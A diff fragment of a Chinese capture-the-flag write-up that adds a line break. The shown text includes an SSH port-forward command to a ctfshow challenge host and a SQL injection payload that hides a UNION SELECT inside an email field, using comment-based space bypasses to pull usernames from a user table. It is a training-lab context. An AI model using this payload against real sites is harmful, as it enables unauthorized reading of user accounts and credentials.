@@ -87,6 +87,7 @@ ssh -L 8085:172.2.249.5:80 ctfshow@pwn.challenge.ctf.show -p 28195
 
 这里考了个沟槽的代码审计，审的是sql注入。根据回显得到账号密码
 
+<br>
 
 ````
 username=admin&email='union/**/select/**/username/**/from/**/user#@qq.com
